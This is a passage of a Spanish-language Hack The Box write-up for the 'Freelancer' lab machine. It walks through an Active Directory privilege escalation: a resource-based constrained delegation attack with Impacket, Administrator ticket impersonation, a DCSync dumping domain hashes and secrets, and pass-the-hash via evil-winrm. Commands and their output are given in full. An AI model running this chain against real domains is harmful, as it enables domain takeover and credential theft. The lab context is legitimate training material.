+</span></span><span style="display:flex;"><span>Warning<span style="color:#960050;background-color:#1e0010">:</span> Remote path completions is disabled due to ruby limitation<span style="color:#960050;background-color:#1e0010">:</span> quoting_detection_proc() <span style="color:#66d9ef">function</span> is unimplemented on this machine
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Data<span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#66d9ef">For</span> more information, check Evil-WinRM GitHub<span style="color:#960050;background-color:#1e0010">:</span> https<span style="color:#960050;background-color:#1e0010">:</span>//github.com/Hackplayers/evil-winrm<span style="color:#75715e">#Remote-path-completion</span>
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Info<span style="color:#960050;background-color:#1e0010">:</span> Establishing connection to remote endpoint
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\lorra199\Documents&gt; whoami
+</span></span><span style="display:flex;"><span>freelancer\lorra199
+</span></span></code></pre></div><h1 id="privilege-escalation">Privilege Escalation</h1>
+<p>Quería utilizar <code>SharpHound.exe</code> para recolectar información pero&hellip;
+<img src="images/Screenshot_33.png" alt="Write-up Image"></p>
+<p>Así que voy a utilizar <code>bloodhound-python</code> desde mi máquina de atacante para ahorrarme problemas.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ bloodhound-python -c All -dc dc.freelancer.htb -d freelancer.htb -ns 10.129.230.3 -u lorra199 -p <span style="color:#e6db74">&#39;PWN3D#l0rr@Armessa199&#39;</span>
+</span></span></code></pre></div><p>Vemos que este usuario pertenece al grupo <code>AD Recycle Bin</code>
+<img src="images/Screenshot_34.png" alt="Write-up Image"></p>
+<p>Y este grupo tiene permisos de <code>GenericWrite</code> sobre el DC. Esto significa que podemos escribir a cualquier atributo de los objetos del DC, incluido los miembros y los SPN por lo cual se acontece un ataque de tipo <code>Resource-Based Constrained Delegation</code>
+<img src="images/Screenshot_35.png" alt="Write-up Image"></p>
+<p>Primero, debemos crear un equipo en el dominio.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ impacket-addcomputer -method SAMR -computer-name <span style="color:#e6db74">&#39;POINTEDSEC$&#39;</span> -computer-pass <span style="color:#e6db74">&#39;Pointed123@&#39;</span> -dc-host dc.freelancer.htb -domain-netbios FREELANCER <span style="color:#e6db74">&#39;freelancer.htb/lorra199:PWN3D#l0rr@Armessa199&#39;</span>
+</span></span><span style="display:flex;"><span>Impacket v0.11.0 - Copyright <span style="color:#ae81ff">2023</span> Fortra
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Successfully added machine account POINTEDSEC$ with password Pointed123@.
+</span></span></code></pre></div><p>Ahora con <code>netexec</code> podemos comprobar que se ha creado correctamente.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ nxc smb freelancer.htb -u <span style="color:#e6db74">&#39;POINTEDSEC$&#39;</span> -p <span style="color:#e6db74">&#39;Pointed123@&#39;</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.230.3    <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows <span style="color:#ae81ff">10</span> / Server <span style="color:#ae81ff">2019</span> Build <span style="color:#ae81ff">17763</span> x64 <span style="color:#f92672">(</span>name:DC<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:freelancer.htb<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:False<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.230.3    <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> freelancer.htb<span style="color:#ae81ff">\P</span>OINTEDSEC$:Pointed123@
+</span></span></code></pre></div><p>Ahora tenemos que configurar al equipo recién creado para que pueda delegar sobre el DC e impersonar los usuarios en el DC.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ impacket-rbcd -delegate-from <span style="color:#e6db74">&#39;POINTEDSEC$&#39;</span> -delegate-to <span style="color:#e6db74">&#39;DC$&#39;</span> -action <span style="color:#e6db74">&#39;write&#39;</span> <span style="color:#e6db74">&#39;freelancer.htb/lorra199:PWN3D#l0rr@Armessa199&#39;</span> -dc-ip 10.129.230.3
+</span></span><span style="display:flex;"><span>Impacket v0.11.0 - Copyright <span style="color:#ae81ff">2023</span> Fortra
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Delegation rights modified successfully!
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> POINTEDSEC$ can now impersonate users on DC$ via S4U2Proxy
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Accounts allowed to act on behalf of other identity:
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span>     POINTEDSEC$   <span style="color:#f92672">(</span>S-1-5-21-3542429192-2036945976-3483670807-12101<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>Ahora solo falta solicitar el TGT de <code>Administrator</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ getST.py -spn <span style="color:#e6db74">&#39;cifs/dc.freelancer.htb&#39;</span> -impersonate <span style="color:#e6db74">&#39;Administrator&#39;</span> <span style="color:#e6db74">&#39;freelancer.htb/POINTEDSEC$:Pointed123@&#39;</span>
+</span></span><span style="display:flex;"><span>Impacket v0.12.0.dev1+20240725.112949.6307900 - Copyright <span style="color:#ae81ff">2023</span> Fortra
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> CCache file is not found. Skipping...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Getting TGT <span style="color:#66d9ef">for</span> user
+</span></span><span style="display:flex;"><span>Kerberos SessionError: KRB_AP_ERR_SKEW<span style="color:#f92672">(</span>Clock skew too great<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>Sabemos que Kerberos utiliza un <code>timestamp</code> para la pre-autenticación, así que vamos a sincronizar la hora de mi equipo con la máquina víctima con <code>ntpdate</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span> sudo ntpdate freelancer.htb
+</span></span><span style="display:flex;"><span>2024-08-05 14:44:26.327717 <span style="color:#f92672">(</span>+0200<span style="color:#f92672">)</span> +10822.139094 +/- 0.019971 freelancer.htb 10.129.230.3 s1 no-leap
+</span></span><span style="display:flex;"><span>CLOCK: time stepped by 10822.139094
+</span></span></code></pre></div><p>Ahora tenemos el ticket de Administrator..</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ getST.py -spn <span style="color:#e6db74">&#39;cifs/dc.freelancer.htb&#39;</span> -impersonate <span style="color:#e6db74">&#39;Administrator&#39;</span> <span style="color:#e6db74">&#39;freelancer.htb/POINTEDSEC$:Pointed123@&#39;</span>
+</span></span><span style="display:flex;"><span>Impacket v0.12.0.dev1+20240725.112949.6307900 - Copyright <span style="color:#ae81ff">2023</span> Fortra
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> CCache file is not found. Skipping...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Getting TGT <span style="color:#66d9ef">for</span> user
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Impersonating Administrator
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Requesting S4U2self
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Requesting S4U2Proxy
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Saving ticket in Administrator@cifs_dc.freelancer.htb@FREELANCER.HTB.ccache
+</span></span></code></pre></div><p>Ahora exportamos la variable de entorno <code>KRB5CCNAME</code> para poder utilizar este ticket TGT.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ export KRB5CCNAME<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>pwd<span style="color:#66d9ef">)</span>/Administrator@cifs_dc.freelancer.htb@FREELANCER.HTB.ccache
+</span></span><span style="display:flex;"><span>┌─<span style="color:#f92672">[</span>192.168.1.52<span style="color:#f92672">]</span>─<span style="color:#f92672">[</span>pointedsec@parrot<span style="color:#f92672">]</span>─<span style="color:#f92672">[</span>~/Desktop/freelancer/content<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└──╼ <span style="color:#f92672">[</span>★<span style="color:#f92672">]</span>$ echo $KRB5CCNAME
+</span></span><span style="display:flex;"><span>/home/pointedsec/Desktop/freelancer/content/Administrator@cifs_dc.freelancer.htb@FREELANCER.HTB.ccache
+</span></span></code></pre></div><p>Y ahora podemos hacer Pass The Ticket con <code>psexec</code> para conseguir una consola como <code>Administrator</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ impacket-psexec freelancer.htb/Administrator@dc.freelancer.htb -k -no-pass
+</span></span><span style="display:flex;"><span>Impacket v0.11.0 - Copyright <span style="color:#ae81ff">2023</span> Fortra
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Requesting shares on dc.freelancer.htb.....
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found writable share ADMIN$
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Uploading file gCTHyGif.exe
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Opening SVCManager on dc.freelancer.htb.....
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Creating service Awdj on dc.freelancer.htb.....
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Starting service Awdj.....
+</span></span></code></pre></div><p>Por alguna razón no termina de salir bien el proceso para conseguir la consola, así que vamos a efectuar un DCSync para con <code>impacket-secretsdump</code> conseguir el hash lm:nt del NTDS.dit de <code>Administrator</code> y hacer Pass The Hash</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ impacket-secretsdump <span style="color:#e6db74">&#39;freelancer.htb/Administrator@dc.freelancer.htb&#39;</span> -k -no-pass
+</span></span><span style="display:flex;"><span>Impacket v0.11.0 - Copyright <span style="color:#ae81ff">2023</span> Fortra
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Target system bootKey: 0x9db1404806f026092ec95ba23ead445b
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Dumping local SAM hashes <span style="color:#f92672">(</span>uid:rid:lmhash:nthash<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Administrator:500:aad3b435b51404eeaad3b435b51404ee:680c12d4ef693a3ae0fcd442c3b5874a:::
+</span></span><span style="display:flex;"><span>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+</span></span><span style="display:flex;"><span>DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> SAM hashes extraction <span style="color:#66d9ef">for</span> user WDAGUtilityAccount failed. The account doesn<span style="color:#960050;background-color:#1e0010">&#39;</span>t have hash information.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Dumping cached domain logon information <span style="color:#f92672">(</span>domain/username:hash<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Dumping LSA Secrets
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> $MACHINE.ACC 
+</span></span><span style="display:flex;"><span>FREELANCER<span style="color:#ae81ff">\D</span>C$:plain_password_hex:1f36a3b5a23441f6054f56f97d29c3312ca75d6d7450912ea81648778b5e540c6f38ab1335f9b27f4c69646359f12f2358d272bc0de36d5a9073b2358f68f1873425130a4b88bd750a55f018f1a83d1108691f4757b92f3f1242147e656fe2e1c38e312d5f26f6d9377cb01a53c38d689a48f4c1fcb5320d06fd6c3184810ba49ec8197a0b14f8e9a06f7a83e68437412e57cfa5bc2aa78a782412c509c139cf2cd85efea4b1ea5cafbb1146bc3eb5431eda9feae2854e25c4d1f357d6dc2844c2b7b86325bdca5985873644bd0b3de57996d8e442cd5996e2206072b8e7e90c621bd4f4f67f52be774a578c2d515d31
+</span></span><span style="display:flex;"><span>FREELANCER<span style="color:#ae81ff">\D</span>C$:aad3b435b51404eeaad3b435b51404ee:89851d57d9c8cc8addb66c59b83a4379:::
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> DPAPI_SYSTEM 
+</span></span><span style="display:flex;"><span>dpapi_machinekey:0xe20295f92e7e0bff2615bed48f0a0be7067e28f2
+</span></span><span style="display:flex;"><span>dpapi_userkey:0xbc3e1b600d881e1867b0bdfe6ec833e9743c07d7
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> NL$KM 
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">0000</span>   D9 0B <span style="color:#ae81ff">60</span> A4 <span style="color:#ae81ff">72</span> C3 B6 <span style="color:#ae81ff">08</span>  E4 F1 FF <span style="color:#ae81ff">54</span> <span style="color:#ae81ff">62</span> <span style="color:#ae81ff">91</span> <span style="color:#ae81ff">65</span> <span style="color:#ae81ff">66</span>   ..<span style="color:#e6db74">`</span>.r......Tb.ef
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">0010</span>   DE EE <span style="color:#ae81ff">19</span> <span style="color:#ae81ff">17</span> <span style="color:#ae81ff">58</span> <span style="color:#ae81ff">31</span> <span style="color:#ae81ff">12</span> CB  DF <span style="color:#ae81ff">25</span> <span style="color:#ae81ff">18</span> D0 <span style="color:#ae81ff">36</span> B0 C1 F4   ....X1...%..6...
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">0020</span>   1B <span style="color:#ae81ff">96</span> C3 5F <span style="color:#ae81ff">22</span> <span style="color:#ae81ff">73</span> F0 D6  B9 <span style="color:#ae81ff">81</span> 2F <span style="color:#ae81ff">26</span> BA <span style="color:#ae81ff">69</span> 6A FD   ..._<span style="color:#e6db74">&#34;s..../&amp;.ij.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> 0030   7F C7 0B 87 71 BE D5 F5  8A 74 B4 3A BD AF DB 71   ....q....t.:...q
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">NL</span>$KM<span style="color:#e6db74">:d90b60a472c3b608e4f1ff5462916566deee1917583112cbdf2518d036b0c1f41b96c35f2273f0d6b9812f26ba696afd7fc70b8771bed5f58a74b43abdafdb71
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[*] _SC_MSSQL</span>$SQLEXPRESS<span style="color:#e6db74"> 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">FREELANCER\sql_svc:v3ryS0l!dP@sswd#34
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[*] Using the DRSUAPI method to get NTDS.DIT secrets
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Administrator:500:aad3b435b51404eeaad3b435b51404ee:0039318f1e8274633445bce32ad1a290:::
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d238e0bfa17d575038efc070187a91c2:::
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">freelancer.htb\mikasaAckerman:1105:aad3b435b51404eeaad3b435b51404ee:e8d62c7d57e5d74267ab6feb2f662674:::
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">sshd:1108:aad3b435b51404eeaad3b435b51404ee:c1e83616271e8e17d69391bdcd335ab4:::
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SQLBackupOperator:1112:aad3b435b51404eeaad3b435b51404ee:c4b746db703d1af5575b5c3d69f57bab:::
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">sql_svc:1114:aad3b435b51404eeaad3b435b51404ee:af7b9d0557964265115d018b5cff6f8a:::
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">lorra199:1116:aad3b435b51404eeaad3b435b51404ee:67d4ae78a155aab3d4aa602da518c051:::
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">freelancer.htb\maya.artmes:1124:aad3b435b51404eeaad3b435b51404ee:22db50a324b9a34ea898a290c1284e25:::
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">freelancer.htb\michael.williams:1126:aad3b435b51404eeaad3b435b51404ee:af7b9d0557964265115d018b5cff6f8a:::
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">freelancer.htb\sdavis:1127:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">freelancer.htb\d.jones:1128:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">freelancer.htb\jen.brown:1129:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">freelancer.htb\taylor:1130:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">freelancer.htb\jmartinez:1131:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">freelancer.htb\olivia.garcia:1133:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">freelancer.htb\dthomas:1134:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">....
+</span></span></span></code></pre></div><p>Tenemos que quedarnos con el hash NT del NTDS.dit que corresponde al dominio, ya que la SAM corresponde a la cuenta local del sistema.</p>
+<pre tabindex="0"><code>Administrator:0039318f1e8274633445bce32ad1a290
+</code></pre><p>Ahora con <code>netexec</code> podemos confirmar que este hash es válido para hacer PTH.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ nxc smb freelancer.htb -u <span style="color:#e6db74">&#39;Administrator&#39;</span> -H <span style="color:#e6db74">&#39;0039318f1e8274633445bce32ad1a290&#39;</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.230.3    <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows <span style="color:#ae81ff">10</span> / Server <span style="color:#ae81ff">2019</span> Build <span style="color:#ae81ff">17763</span> x64 <span style="color:#f92672">(</span>name:DC<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:freelancer.htb<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:False<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.230.3    <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> freelancer.htb<span style="color:#ae81ff">\A</span>dministrator:0039318f1e8274633445bce32ad1a290 <span style="color:#f92672">(</span>Pwn3d!<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>Sigue sin darme la consola con <code>psexec</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ impacket-psexec -hashes <span style="color:#e6db74">&#39;:0039318f1e8274633445bce32ad1a290&#39;</span> Administrator@10.129.230.3
+</span></span><span style="display:flex;"><span>Impacket v0.11.0 - Copyright <span style="color:#ae81ff">2023</span> Fortra
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Requesting shares on 10.129.230.3.....
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found writable share ADMIN$
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Uploading file IsscEUer.exe
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Opening SVCManager on 10.129.230.3.....
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Creating service whwo on 10.129.230.3.....
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Starting service whwo.....
+</span></span></code></pre></div><p>Pero ahora teniendo el hash podemos conectarnos via WinRM</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ evil-winrm -i 10.129.230.3 -u Administrator -H <span style="color:#e6db74">&#39;0039318f1e8274633445bce32ad1a290&#39;</span>
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Evil-WinRM shell v3.5
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span style="color:#f92672">()</span> <span style="color:#66d9ef">function</span> is unimplemented on this machine
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Info: Establishing connection to remote endpoint
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\A</span>dministrator<span style="color:#ae81ff">\D</span>ocuments&gt; whoami
+</span></span><span style="display:flex;"><span>freelancer<span style="color:#ae81ff">\a</span>dministrator
+</span></span></code></pre></div><p>Y ya podríamos visualizar la flag de root.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\A</span>dministrator<span style="color:#ae81ff">\D</span>esktop&gt; dir
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    Directory: C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\A</span>dministrator<span style="color:#ae81ff">\D</span>esktop
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Mode                LastWriteTime         Length Name
+</span></span><span style="display:flex;"><span>----                -------------         ------ ----
+</span></span><span style="display:flex;"><span>-ar---         8/5/2024   6:11 AM             <span style="color:#ae81ff">34</span> root.txt
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\A</span>dministrator<span style="color:#ae81ff">\D</span>esktop&gt; type root.txt
+</span></span><span style="display:flex;"><span>e68eceea24d49627cc...
+</span></span></code></pre></div><p>¡Y ya estaría!</p>
+<p>Happy Hacking! 🚀</p>
+
+    </div>
+
+    
+
+            </div>
+        </div><footer class="text-center pb-1">
+    <small class="text-muted">
+        
+            &copy; 2024, Andrés Del Cerro
+        
+        <br>
+        Powered by <a href="https://gohugo.io/" target="_blank">Hugo</a>
+        and <a href="https://github.com/austingebauer/devise" target="_blank">Devise</a>
+    </small>
+</footer>
+</body>
+</html>
